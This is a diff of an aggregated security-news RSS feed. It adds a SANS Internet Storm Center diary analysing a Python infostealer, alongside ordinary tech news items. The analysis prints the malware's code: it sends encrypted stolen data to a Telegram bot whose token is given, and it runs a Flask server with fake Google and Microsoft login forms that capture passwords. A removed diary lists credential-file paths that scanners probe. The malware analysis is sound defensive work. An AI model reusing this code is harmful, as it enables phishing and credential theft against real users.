@@ -1,5 +1,82 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 06 May 2025 06:59:18 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>ISC Stormcast For Tuesday, May 6th, 2025 https://isc.sans.edu/podcastdetail/9438</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>ISC Stormcast For Tuesday, May 6th, 2025 https://isc.sans.edu/podcastdetail/9438, (Tue, May 6th)</title><link>https://isc.sans.edu/diary/rss/31922</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31922</guid></item><item><title>"Mirai" Now Exploits Samsung MagicINFO CMS (CVE-2024-7399), (Mon, May 5th)</title><link>https://isc.sans.edu/diary/rss/31920</link><description>&lt;p&gt;Last August, Samsung patched an arbitrary file upload vulnerability that could lead to remote code execution &amp;#x5b;1&amp;#x5d;. The announcement was very sparse and did not even include affected systems:&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;Last August, Samsung patched an arbitrary file upload vulnerability that could lead to remote code execution [1]. The announcement was very sparse and did not even include affected systems:&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 06 May 2025 07:59:21 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Python InfoStealer with Embedded Phishing Webserver</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Python InfoStealer with Embedded Phishing Webserver, (Tue, May 6th)</title><link>https://isc.sans.edu/diary/rss/31924</link><description>&lt;p&gt;Infostealers are everywhere for a while now. If this kind of malware is not aggressive, their impact can be much more impacting to the victim. Attackers need always more and more data to be sold or reused in deeper scenarios. A lot of infostealers are similar and have the following capabilities:&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;Infostealers are everywhere for a while now. If this kind of malware is not aggressive, their impact can be much more impacting to the victim. Attackers need always more and more data to be sold or reused in deeper scenarios. A lot of infostealers are similar and have the following capabilities:&lt;/p&gt;
+
+&lt;ul&gt;
+	&lt;li&gt;Antidebugging and anti-VM capabilities&lt;/li&gt;
+	&lt;li&gt;Persistence&lt;/li&gt;
+	&lt;li&gt;Data scanner (credentials, cookies, wallets, &amp;quot;interesting&amp;quot; keyword in files, ...)&lt;/li&gt;
+	&lt;li&gt;Exfiltration&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I found another malicious Python script that implements all these capabilities. Persistence is implemeted via a Registry key and a scheduled task (always have a backup solution &lt;img alt="wink" height="23" src="https://isc.sans.edu/3p/ckeditor4_11/plugins/smiley/images/wink_smile.png" title="wink" width="23" /&gt;), a keylogger is started, the clipboard content is captured, a screenshot is taken every minute. All data is exfiltrated to a Telegram channel, encrtypted with the Fernet() module:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+brAljAVm = &amp;quot;7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU&amp;quot;
+WmeLPHIr = &amp;quot;5395609882&amp;quot;
+UJSfiUOF = f&amp;quot;hxxps://api[.]telegram[.]org/bot{brAljAVm}&amp;quot;
+
+def TeqIMJxB(text):
+&amp;nbsp; &amp;nbsp; try:
+&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; enc = bsSlwZVy.encrypt(text.encode())
+&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; requests.post(f&amp;quot;{UJSfiUOF}/sendMessage&amp;quot;, data={&amp;quot;chat_id&amp;quot;: WmeLPHIr, &amp;quot;text&amp;quot;: enc.decode()})
+&amp;nbsp; &amp;nbsp; except:
+&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; pass
+&lt;/pre&gt;
+
+&lt;p&gt;All &amp;quot;modules&amp;quot; are started in separate threads:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+threading.Thread(target=HXSuYqeM, daemon=True).start()
+threading.Thread(target=FRgNaDwJ, daemon=True).start()
+threading.Thread(target=yReyYwvL, daemon=True).start()
+threading.Thread(target=MinLOVga, daemon=True).start()
+&lt;/pre&gt;
+
+&lt;p&gt;What's different in this InfoStealer? The presense of an embedded Flask server[&lt;a href="https://flask.palletsprojects.com/en/stable/"&gt;1&lt;/a&gt;] used to spawn a rogue webserver:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+def MinLOVga():
+    app = Flask(__name__)
+    fake_sites = {
+        &amp;quot;google&amp;quot;: &amp;quot;https://accounts.google.com&amp;quot;,
+        &amp;quot;microsoft&amp;quot;: &amp;quot;https://login.microsoftonline.com&amp;quot;
+    }
+    @app.route(&amp;quot;/login/&amp;lt;template&amp;gt;&amp;quot;, methods=[&amp;quot;GET&amp;quot;, &amp;quot;POST&amp;quot;])
+    def login(template):
+        if request.method == &amp;quot;POST&amp;quot;:
+            creds = f&amp;quot;{request.form.get('username')}:{request.form.get('password')}&amp;quot;
+            TeqIMJxB(f&amp;quot;🎣 {template.upper()} PHISH: {creds}&amp;quot;)
+            return redirect(fake_sites.get(template, &amp;quot;https://google.com&amp;quot;))
+        return '''
+        &amp;lt;form method=&amp;quot;POST&amp;quot;&amp;gt;
+            &amp;lt;input name=&amp;quot;username&amp;quot; placeholder=&amp;quot;Email&amp;quot;&amp;gt;&amp;lt;br&amp;gt;
+            &amp;lt;input name=&amp;quot;password&amp;quot; type=&amp;quot;password&amp;quot; placeholder=&amp;quot;Password&amp;quot;&amp;gt;&amp;lt;br&amp;gt;
+            &amp;lt;button&amp;gt;Login&amp;lt;/button&amp;gt;
+        &amp;lt;/form&amp;gt;
+        '''
+    try:
+        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
+        context.load_cert_chain(&amp;quot;cert.pem&amp;quot;, &amp;quot;key.pem&amp;quot;)
+        threading.Thread(target=app.run, kwargs={
+            &amp;quot;host&amp;quot;: &amp;quot;0.0.0.0&amp;quot;, &amp;quot;port&amp;quot;: 443, &amp;quot;ssl_context&amp;quot;: context
+        }, daemon=True).start()
+    except: pass
+&lt;/pre&gt;
+
+&lt;p&gt;You can see that the HTTPS server is started using local files cert.pem and key.pem. I did not find them. I presume that this script is part of a &amp;quot;package&amp;quot; distributed to the victim and containing all required files.&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;The script is called &amp;quot;2.py&amp;quot; (SHA256:538485a12db0a673623dfbf1ea1ae61a68c5e8f0df5049a51399f30d48aa15d2). Based on the comments in the code, it seems to have been developed by a Turkish threat actor. The VT score is still very low: 3/63[&lt;a href="https://www.virustotal.com/gui/file/538485a12db0a673623dfbf1ea1ae61a68c5e8f0df5049a51399f30d48aa15d2/detection"&gt;2&lt;/a&gt;].&lt;/p&gt;
+
+&lt;p&gt;[1]&amp;nbsp;&lt;a href="https://flask.palletsprojects.com/en/stable/"&gt;https://flask.palletsprojects.com/en/stable/&lt;/a&gt;&lt;br /&gt;
+[2]&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/file/538485a12db0a673623dfbf1ea1ae61a68c5e8f0df5049a51399f30d48aa15d2/detection"&gt;https://www.virustotal.com/gui/file/538485a12db0a673623dfbf1ea1ae61a68c5e8f0df5049a51399f30d48aa15d2/detection&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Xavier Mertens (@xme)&lt;br /&gt;
+Xameco&lt;br /&gt;
+Senior ISC Handler - Freelance Cyber Security Consultant&lt;br /&gt;
+&lt;a href="https://keybase.io/xme/key.asc"&gt;PGP Key&lt;/a&gt;&lt;/p&gt;
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31924</guid></item><item><title>ISC Stormcast For Tuesday, May 6th, 2025 https://isc.sans.edu/podcastdetail/9438, (Tue, May 6th)</title><link>https://isc.sans.edu/diary/rss/31922</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31922</guid></item><item><title>"Mirai" Now Exploits Samsung MagicINFO CMS (CVE-2024-7399), (Mon, May 5th)</title><link>https://isc.sans.edu/diary/rss/31920</link><description>&lt;p&gt;Last August, Samsung patched an arbitrary file upload vulnerability that could lead to remote code execution &amp;#x5b;1&amp;#x5d;. The announcement was very sparse and did not even include affected systems:&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;Last August, Samsung patched an arbitrary file upload vulnerability that could lead to remote code execution [1]. The announcement was very sparse and did not even include affected systems:&lt;/p&gt;
 
 &lt;blockquote&gt;
 &lt;p&gt;&lt;code&gt;SVP-AUG-2024&lt;br /&gt;
@@ -1862,76 +1939,7 @@ gbruneau at isc dot sans dot edu&lt;/p&gt;
 &lt;p&gt;[&amp;#8230;]&lt;/p&gt;
 &lt;p&gt;In making her ruling, Northern District of California Judge Phyllis Hamilton said NSO Group undercut its arguments to use evidence about its customers with contradictory statements.&lt;/p&gt;
 &lt;p&gt;&amp;#8220;Defendants cannot claim, on the one hand, that its intent is to help its clients fight terrorism and child exploitation, and on the other hand say that it has nothing to do with what its client does with the technology, other than advice and support,&amp;#8221; she wrote. &amp;#8220;Additionally, there is no evidence as to the specific kinds of crimes or security threats that its clients actually investigate and none with respect to the attacks at issue.&amp;#8221;&lt;/p&gt;&lt;/blockquote&gt;
-&lt;p&gt;I have &lt;a href="https://www.schneier.com/academic/archives/2022/03/platforms-encryption-and-the-cfaa-the-case-of-whatsapp-v-nso-group.html"&gt;written about&lt;/a&gt; the issues at play in this case.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=70182</guid><category>Uncategorized</category><category>courts</category><category>hacking</category><category>Meta</category><category>WhatsApp</category></item><item><title>Duolingo to Replace Human Contractors With Bots, Become ‘AI-First’</title><link>https://www.techrepublic.com/article/news-duolingo-replaces-contractors-ai/</link><description>CEO Luis von Ahn said Duolingo “cares deeply about its employees” and the changes aren’t “about replacing Duos with AI.”</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4304080</guid><category>Artificial Intelligence</category><category>News</category><category>Tech Industry</category><category>ai</category><category>artificial intelligence</category><category>duolingo</category><category>layoffs</category><category>tech industry</category><category>tech jobs</category></item><item><title>More Scans for SMS Gateways and APIs, (Tue, Apr 29th)</title><link>https://isc.sans.edu/diary/rss/31902</link><description>&lt;p&gt;Last week, I wrote about scans for Teltonika Networks SMS Gateways. Attackers are always looking for cheap (free) ways to send SMS messages and gain access to not-blocklisted numbers. So, I took a closer look at similar scans we have seen. &lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;Last week, I wrote about scans for Teltonika Networks SMS Gateways. Attackers are always looking for cheap (free) ways to send SMS messages and gain access to not-blocklisted numbers. So, I took a closer look at similar scans we have seen.&amp;nbsp;&lt;/p&gt;
-
-&lt;p&gt;There are numerous ways to send SMS messages; using a hardware SMS gateway is probably one of the more fancy ways to do so. Most websites use messaging services. For example, we do see scans for SMS plugins for WordPress:&lt;/p&gt;
-
-&lt;p&gt;These scans look for style sheet files (.css) that are part of the respective plugins. It is fair to assume that if the respective style sheet is present, the attacker will attempt to obtain access to the site:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;/wp-content/plugins/sms-alert/css/admin.css&lt;br /&gt;
-/wp-content/plugins/mediaburst-email-to-sms/css/clockwork.css&lt;br /&gt;
-/wp-content/plugins/verification-sms-targetsms/css/targetvr-style.css&lt;br /&gt;
-/wp-content/plugins/wp-sms/assets/css/admin-bar.css&lt;br /&gt;
-/wp-content/plugins/textme-sms-integration/css/textme.css&lt;br /&gt;
-/wp-content/plugins/sms-alert/css/admin.css&lt;/code&gt;&lt;br /&gt;
-&amp;nbsp;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;We also got a few odd, maybe broken, scans like:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;/api/v1/livechat/sms-incoming/%%target%%/wp-content/themes/twentytwentyone/assets/css/print.css&lt;br /&gt;
-/api/v1/livechat/sms-incoming/%%target%%/wp-content/themes/twentytwentyone/assets/js/responsive-embeds.js&lt;/code&gt;&lt;br /&gt;
-&amp;nbsp;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;The &amp;quot;%%target%%&amp;quot; part was likely supposed to be replaced with a directory name.&lt;/p&gt;
-
-&lt;p&gt;And we have scans for some configuration files that may contain credentials for SMS services like:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;/twilio/.config/bin/aws/lib/.env&lt;br /&gt;
-/twilio-labs/configure-env&lt;br /&gt;
-/twillio_creds.php&lt;br /&gt;
-/twilio/.secrets&lt;br /&gt;
-/sms_config.json&lt;br /&gt;
-/sms/actuator/env&lt;br /&gt;
-/sms/env&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;And many similar URLs.&lt;/p&gt;
-
-&lt;p&gt;Scans also look for likely API endpoints used to send SMS messages. I am not sure if they are associated with a particular product or software:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;/sms/api/&lt;br /&gt;
-/api/v1/livechat/sms-incoming/twilio&lt;br /&gt;
-/sms.py&lt;br /&gt;
-/Sms_Bomber.exe&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;SMS_bomber.exe is a script designed to send mass SMS messages [1]. The scans may attempt to identify copies left behind by other attackers.&lt;/p&gt;
-
-&lt;p&gt;SMS_bomber also suggests the use of a proxy, and we have some scans that are looking for proxies to find websites used to send SMS:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;https://sms-activate.org&lt;/code&gt;&lt;br /&gt;
-&amp;nbsp;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Not properly securing SMS gateways or credentials used to connect to SMS services could result in significant costs if an attacker abuses the service. It may also make the phone number unusable, as telecom providers and end users will block it. This may also result in reputational damage, and you will likely have to use a different phone number after it has been abused.&lt;/p&gt;
-
-&lt;p&gt;&amp;nbsp;&lt;/p&gt;
-
-&lt;p&gt;[1]&amp;nbsp;https://github.com/iAditya-Nanda/SMS_Bomber&lt;/p&gt;
-
-&lt;p&gt;---&lt;br /&gt;
-Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;SANS.edu&lt;/a&gt;&lt;br /&gt;
-&lt;a href="https://jbu.me/164"&gt;Twitter&lt;/a&gt;|&lt;/p&gt;
-
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31902</guid></item><item><title>State of AI in America: New Survey Findings ‘Raise Serious Concerns’</title><link>https://www.techrepublic.com/article/news-kpmg-ai-survey/</link><description>US consumers are leery about using AI, while employees are eager to reap the benefits of AI in the workplace.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4304065</guid><category>Artificial Intelligence</category><category>News</category><category>ai</category><category>AI governance</category><category>ai regulation</category><category>ai trust</category><category>artificial intelligence</category><category>kpmg</category></item><item><title>Microsoft announces the 2025 Security Excellence Awards winners</title><link>https://www.microsoft.com/en-us/security/blog/2025/04/29/microsoft-announces-the-2025-security-excellence-awards-winners/</link><description>&lt;p&gt;Congratulations to the winners of the Microsoft Security Excellence Awards that recognize the innovative defenders who have gone above and beyond.&lt;/p&gt;
+&lt;p&gt;I have &lt;a href="https://www.schneier.com/academic/archives/2022/03/platforms-encryption-and-the-cfaa-the-case-of-whatsapp-v-nso-group.html"&gt;written about&lt;/a&gt; the issues at play in this case.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=70182</guid><category>Uncategorized</category><category>courts</category><category>hacking</category><category>Meta</category><category>WhatsApp</category></item><item><title>Duolingo to Replace Human Contractors With Bots, Become ‘AI-First’</title><link>https://www.techrepublic.com/article/news-duolingo-replaces-contractors-ai/</link><description>CEO Luis von Ahn said Duolingo “cares deeply about its employees” and the changes aren’t “about replacing Duos with AI.”</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4304080</guid><category>Artificial Intelligence</category><category>News</category><category>Tech Industry</category><category>ai</category><category>artificial intelligence</category><category>duolingo</category><category>layoffs</category><category>tech industry</category><category>tech jobs</category></item><item><title>State of AI in America: New Survey Findings ‘Raise Serious Concerns’</title><link>https://www.techrepublic.com/article/news-kpmg-ai-survey/</link><description>US consumers are leery about using AI, while employees are eager to reap the benefits of AI in the workplace.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4304065</guid><category>Artificial Intelligence</category><category>News</category><category>ai</category><category>AI governance</category><category>ai regulation</category><category>ai trust</category><category>artificial intelligence</category><category>kpmg</category></item><item><title>Microsoft announces the 2025 Security Excellence Awards winners</title><link>https://www.microsoft.com/en-us/security/blog/2025/04/29/microsoft-announces-the-2025-security-excellence-awards-winners/</link><description>&lt;p&gt;Congratulations to the winners of the Microsoft Security Excellence Awards that recognize the innovative defenders who have gone above and beyond.&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/04/29/microsoft-announces-the-2025-security-excellence-awards-winners/"&gt;Microsoft announces the 2025 Security Excellence Awards winners&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;In today’s rapidly evolving digital world, security requires a global community of defenders working together as a team to build a safer world for all. That’s why we’re thrilled to recognize the extraordinary individuals and organizations who have gone above and beyond in the fight against cyberthreats with the 2025 Microsoft Security Excellence Awards.&lt;/p&gt;
 
 
